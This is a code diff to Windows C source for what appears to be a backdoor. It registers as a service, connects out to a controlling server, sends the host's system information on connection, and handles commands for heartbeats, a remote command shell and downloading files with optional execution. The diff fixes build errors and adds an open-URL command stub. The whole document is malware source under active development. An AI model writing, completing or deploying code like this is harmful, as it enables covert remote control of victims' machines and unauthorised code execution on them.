@@ -5,7 +5,7 @@
 #include <stdlib.h>
 #include <wininet.h>
 
-
+// GCC lwininet ws2_32
 #pragma comment(lib, "ws2_32.lib")
 #pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
 #define S_OK                                   ((HRESULT)0L)
@@ -13,10 +13,11 @@
 #define false                                  FALSE
 #define true                                   TRUE
 #define bool                                   BOOL
-#define ERROR_SUCCESS                    0L
+#define ERROR_SUCCESS                           0L
 #define SERVER_HEARTS                           0
 #define SERVER_SHELL                            2
 #define SERVER_DOWNLOAD                         4
+#define SERVER_OPENURL                          8
 // int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
@@ -34,12 +35,12 @@ struct CMSG{
 struct CFILE{
     char address[255];
     char save_path[255];
-    bool execute;
-}
+    int execute;
+};
 
 //-----------------------------TOOLKIT FUNCTION START------------------------------------------------
 
-bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
+BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
 {
 	HINTERNET	hInternet, hUrl;
 	HANDLE		hFile;
@@ -75,6 +76,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 	
 	return bRet;
 }
+
 DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,bool execute)
 {
 	int	nUrlLength;
@@ -314,7 +316,14 @@ void Handle(){
     if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
         return;
     }
-    char * systeminfo = getSystemInfomation();
+    const char * systeminfo = getSystemInfomation();
+    struct CMSG msg = {
+                .sign =  "customize",
+                .mod = SERVER_HEARTS,
+                .msg_l = strlen(systeminfo)
+             };
+    send(sock,(char*)&msg,sizeof(struct CMSG),0);
+    send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
     while (TRUE){
         char * address = malloc(sizeof(struct CMSG));
         int ret = recv(sock,address,sizeof(struct CMSG),0);
@@ -330,11 +339,10 @@ void Handle(){
             case SERVER_HEARTS:
                 {struct CMSG msg = {
                 .sign =  "customize",
-                .mod = 0,
-                .msg_l = strlen(systeminfo)
+                .mod = SERVER_HEARTS,
+                .msg_l = 0
              };}
                 ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
-                ret = send(sock,systeminfo,strlen(systeminfo),0);
                 continue;
             case SERVER_SHELL:
                 // CMD命令
@@ -346,15 +354,19 @@ void Handle(){
                     if (ret <= 0){
                         continue;
                     }
-                    if(f_obj.address && f_obj.save_path == "NULL"){
-                        DownManager(f_obj_address,NULL,f_obj.execute);
+                    if(f_obj->address && f_obj->save_path == "NULL"){
+                        DownManager(f_obj->address,NULL,f_obj->execute);
                         
                     }else{
-                        DownManager(f_obj_address,f_obj.save_path,f_obj.execute);
+                        DownManager(f_obj->address,f_obj->save_path,f_obj->execute);
                     }
                     
                 }
-
+            case SERVER_OPENURL:
+                {
+                    continue;
+                }
+            
             
 
         }
